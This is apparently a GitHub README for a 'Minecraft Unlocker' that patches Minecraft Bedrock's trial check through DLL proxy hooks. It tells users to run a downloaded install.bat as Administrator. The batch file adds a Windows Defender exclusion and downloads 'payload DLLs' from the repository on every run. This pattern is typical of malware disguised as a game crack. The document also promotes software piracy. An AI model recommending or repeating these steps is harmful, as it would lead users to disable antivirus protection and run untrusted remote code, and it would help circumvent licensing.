# Minecraft Unlocker by errortechh

A tool to unlock Minecraft for Windows (Bedrock Edition).

## 🚀 Quick Install

1. Download [`install.bat`](https://raw.githubusercontent.com/krinjalku/FIXMINECRAFTFILES/main/install.bat)
2. Right-click → **Run as Administrator**
3. Done! A desktop shortcut will be created.

## 📦 What the Installer Does

- Downloads `minecraft_unlocker.exe` to `%APPDATA%\minecraft unlocker\`
- Sets up engine configs for two unlock methods:
  - **OnlineFix Method** — winmm proxy + OnlineFix DLL hooks
  - **errortechh method** — vcruntime proxy + isTrial patch
- Creates a desktop shortcut
- Adds Windows Defender exclusion
- Payload DLLs are downloaded fresh from this repo every time you unlock

## 🛠️ Manual Install

If you prefer manual installation:

1. Download `minecraft_unlocker.exe` from [Releases](../../releases/latest)
2. Place it in `%APPDATA%\minecraft unlocker\`
3. Download `premium_bg.png` from Releases and place it in the same folder
4. Run the exe

## 🗑️ Uninstall

1. Download [`uninstall.bat`](https://raw.githubusercontent.com/krinjalku/FIXMINECRAFTFILES/main/uninstall.bat)
2. Run it
3. Or manually delete `%APPDATA%\minecraft unlocker\` and the desktop shortcut

## ⚙️ Features

- 🎮 **Game detection** — Auto-detects Minecraft installation
- 📥 **Auto-download** — Downloads unlock files from GitHub on every use
- 🔄 **Game tracker** — Shows "PLAYING..." while game is running, resets when closed
- 🌿 **Grass block icon** — Custom Minecraft-themed app icon
- 💻 **AppData storage** — All data stored in `%APPDATA%\minecraft unlocker\`
- 🔗 **Desktop shortcut** — Created automatically on first run

## 📁 Repository Structure

```
engine_a/          ← OnlineFix method payload files
engine_b/          ← errortechh method payload files  
install.bat        ← One-click installer
uninstall.bat      ← Uninstaller
```

## 👨‍💻 Credits

Made by **errortechh** — [YouTube](https://youtube.com/@errortechh)
